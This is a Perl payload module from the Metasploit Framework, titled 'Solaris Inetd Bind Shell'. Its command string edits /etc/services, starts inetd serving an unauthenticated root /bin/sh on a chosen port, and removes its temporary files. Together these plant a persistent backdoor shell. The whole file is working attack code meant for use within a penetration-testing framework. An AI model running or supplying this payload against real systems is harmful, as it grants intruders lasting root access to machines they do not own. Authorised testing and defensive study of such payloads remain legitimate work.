
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::cmd_sol_bind;
use strict;
use base 'Msf::PayloadComponent::CommandPayload';
sub _Load {
  Msf::PayloadComponent::CommandPayload->_Import('Msf::PayloadComponent::BindConnection');
  __PACKAGE__->SUPER::_Load();
}

my $info =
{
  'Name'         => 'Solaris Inetd Bind Shell',
  'Version'      => '$Revision$',
  'Description'  => 'Use inetd to create a persistent bindshell',
  'Authors'      => [ 'H D Moore <hdm [at] metasploit.com>', ],
  'Priv'         => 1,
  'OS'           => [ 'solaris' ],
  'Size'         => '',
};

sub new {
  _Load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}

sub CommandString {
  my $self = shift;
  my $port = $self->GetVar('LPORT');

  my $command =
  "grep -v msfbind /etc/services>/tmp/.msf_svcs$$;".
  "echo msfbind $port/tcp>>/tmp/.msf_svcs$$;".
  "cp /tmp/.msf_svcs$$ /etc/services;".
  "echo msfbind stream tcp nowait root /bin/sh sh>/tmp/.msf_inet$$;".
  "/usr/sbin/inetd -s /tmp/.msf_inet$$;".
  "rm /tmp/.msf_inet$$ /tmp/.msf_svcs$$;";

  return($command);
}
